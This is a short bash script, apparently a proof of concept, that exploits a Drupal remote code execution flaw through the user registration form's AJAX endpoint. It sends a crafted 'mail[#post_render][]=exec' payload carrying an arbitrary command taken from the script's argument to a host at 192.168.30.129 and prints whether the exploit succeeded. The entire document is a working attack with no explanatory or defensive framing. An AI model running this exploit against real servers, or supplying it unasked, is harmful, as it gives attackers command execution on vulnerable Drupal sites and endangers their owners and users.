#!/bin/bash

RHOST=192.168.30.129
URL="http://$RHOST/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
CMD=$1

STATUS=$(curl -s \
              -o /dev/null \
              -w %{http_code} \
              --data-urlencode "form_id=user_register_form" \
              --data-urlencode "_drupal_ajax=1" \
              --data-urlencode "mail[#post_render][]=exec" \
              --data-urlencode "mail[#type]=markup" \
              --data-urlencode "mail[#markup]=$CMD" \
              $URL)

if [ $STATUS -eq 200 ]; then
  echo "[+] Exploit Successful"
else
  echo "[!] Exploit Failed"
fi
